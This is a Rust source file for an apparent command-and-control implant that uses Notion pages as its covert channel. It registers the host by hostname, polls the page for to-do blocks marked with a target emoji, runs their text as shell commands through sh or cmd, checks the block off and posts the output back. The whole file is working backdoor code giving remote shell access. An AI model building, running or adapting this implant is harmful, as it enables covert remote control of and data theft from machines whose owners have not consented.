extern crate reqwest;
extern crate tokio;
extern crate serde_json;

use std::process::Command;
use std::error::Error;
// use std::io;
use std::collections::HashMap;
use std::io::{self, Read, BufRead, Write};
use std::{thread, time};

use tokio::task;
use serde_json::{json};

use reqwest::{Client, ClientBuilder};
use reqwest::header::{HeaderMap, HeaderValue, AUTHORIZATION, CONTENT_TYPE};


const URL_BASE: &str = "https://api.notion.com/v1";
const API_KEY_URL: &str = "http://localhost:8888";

#[derive(Debug)]
struct ConfigOptions {
    sleep_interval: u64,
    parent_page_id: String,
    api_key: String
}

fn getConfigOptions() -> Result<ConfigOptions, Box<dyn Error + Send + Sync>> {
   
    println!("Getting config options!");
    let mut stdin = std::io::stdin();
    
    println!("Getting sleep");

    let mut sleep_interval = String::new();
    print!("[*] Enter agent sleep interval > ");
    io::stdout().flush()?;
    stdin.read_line(&mut sleep_interval)?;

    println!("Getting parent");
    
    let mut parent_page_id = String::new();
    print!("[*] Enter parent page id > ");
    io::stdout().flush()?;
    stdin.read_line(&mut parent_page_id)?;
    
    let mut api_key = String::new();
    println!("[*] Enter API Key > ");
    io::stdout().flush()?;
    stdin.read_line(&mut api_key)?;

    Ok(
        ConfigOptions { 
            sleep_interval: sleep_interval.trim().parse().unwrap(),
            parent_page_id: String::from(parent_page_id.trim()),
            api_key: String::from(api_key.trim())
        }
    )
}

async fn create_page(client: &Client, config_options: &ConfigOptions, hostname: String) -> Option<String> {
    println!("Creating page...");
    let url = format!("{}/pages/", URL_BASE);
    
    // Craft JSON Body
    let hn = hostname::get().ok()?;
    let body: serde_json::Value = json!({
        "parent": {
            "type": "page_id",
            "page_id": config_options.parent_page_id
        },
        "properties": {
            "title": [{
                "text": {
                    "content": hostname
                }
            }]
        }
    });
    let r = client
        .post(url)
        .json(&body)
        .send()
        .await
        .unwrap();
    
    if r.status().is_success() {
        let res_body = r.json::<serde_json::Value>().await.unwrap();
        return Some(String::from(res_body["id"].as_str()?));
    }
    println!("{}",r.text().await.unwrap());
    None
}

async fn get_blocks(client: &Client, page_id: &String) -> Result<serde_json::Value, String> {
    let url = format!("{URL_BASE}/blocks/{page_id}/children");

    let r = client.get(url).send().await.unwrap();

    if r.status().is_success() {
        println!("Got blocks");
        let blocks = r.json::<serde_json::Value>().await.unwrap();
        match blocks.get("results") {
            Some(bs) => {
                println!("{:?}", bs);
                return Ok(bs.to_owned())
            },
            None => return Ok(json!([]))
        }
    }
    Err(r.text().await.unwrap())
}

async fn complete_command(client: &Client, mut command_block: serde_json::Value) {
    
    // Set completed status
    command_block["to_do"]["checked"] = serde_json::to_value(true).unwrap();
    let block_id = command_block["id"].as_str().unwrap();
    let url = format!("{URL_BASE}/blocks/{block_id}");
    let r = client
        .patch(url)
        .json(&command_block)
        .send()
        .await
        .unwrap();

    if !r.status().is_success() {
        println!("{}",r.text().await.unwrap());
    }
}

async fn send_result(client: &Client, command_block_id: &str, output: String) {
    let url = format!("{URL_BASE}/blocks/{command_block_id}/children");
    let body : serde_json::Value = json!({
        "children": [
            {
                "object": "block",
                "type": "quote",
                "quote": {
                    "text": [
                        {
                            "type": "text",
                            "text": {"content": output},
                            "annotations": {"code": true}
                        }
                    ]
                }
            }
        ]
    });
    let r = client
        .patch(url)
        .json(&body)
        .send()
        .await
        .unwrap();
    
    if !r.status().is_success() {
        println!("{}",r.text().await.unwrap());
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    
    println!("Starting!");
    
    let config_options_handle = tokio::spawn( async {
        return getConfigOptions();
        
    });
    let config_options = config_options_handle.await?.unwrap();
    let hn = hostname::get()
        .ok()
        .unwrap()
        .into_string()
        .unwrap();
    println!("{:?}", hn);
    println!("{:?}", config_options);
    let mut headers = HeaderMap::new();
    headers.insert("Notion-Version", "2021-08-16".parse()?);
    headers.insert(CONTENT_TYPE, "application/json".parse()?);
    headers.insert(AUTHORIZATION, format!("Bearer {}", config_options.api_key).parse()?);
    let client = Client::builder()
        .default_headers(headers)
        .build()?;

    let page_id = create_page(&client, &config_options, hn)
    .await
    .unwrap();

    let sleep_time = 
        time::Duration::from_secs(config_options.sleep_interval);
    
    loop {
        // Get Blocks
        let blocks = get_blocks(&client, &page_id).await?;
        let command_blocks: Vec<&serde_json::Value> = blocks
            .as_array()
            .unwrap()
            .into_iter()
            .filter(|&b| b["type"] == "to_do")
            .collect();

        let mut new_command_blocks: Vec<&serde_json::Value> = command_blocks
            .into_iter()
            .filter(|&b| b["to_do"]["checked"] == false)
            .collect();

        for mut block in new_command_blocks {
            match block["to_do"]["text"][0]["text"]["content"].as_str() {
                Some(s) => {
                    if s.contains("🎯") {
                        let output = if cfg!(target_os = "windows") {
                            Command::new("cmd")
                                .args(["/c", s.replace("🎯", "").as_str()])
                                .output()
                                .expect("failed to execute process")
                        } else {
                            Command::new("sh")
                                .arg("-c")
                                .arg(s.replace("🎯", ""))
                                .output()
                                .expect("failed to execute process")
                        };
                        
                        let command_block_id = block["id"].as_str().unwrap();
                        let mut output_string: String;
                        complete_command(&client, block.to_owned()).await;
                        if output.stderr.len() > 0 {
                            output_string = String::from_utf8(output.stderr).unwrap();
                        } else {
                            output_string = String::from_utf8(output.stdout).unwrap();
                        }
                        send_result(&client, command_block_id, output_string).await;
                        
                    };

                },
                None => { continue; }
            }
        }

        thread::sleep(sleep_time);
        println!("ZZZZ");
    }

    Ok(())
}
